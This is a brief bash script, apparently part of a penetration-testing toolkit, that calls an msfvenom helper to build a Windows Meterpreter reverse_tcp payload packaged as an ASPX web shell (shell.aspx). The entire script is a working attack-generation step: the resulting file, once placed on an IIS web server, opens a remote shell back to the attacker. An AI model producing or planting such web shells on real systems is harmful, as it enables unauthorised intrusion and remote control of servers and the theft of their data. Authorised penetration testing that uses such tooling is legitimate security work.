#!/bin/bash

: '
Create ASPX file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="windows/meterpreter/reverse_tcp"
format="aspx"
filename="shell.aspx"

create_reverse_shell "${payload}" "${format}" "${filename}"
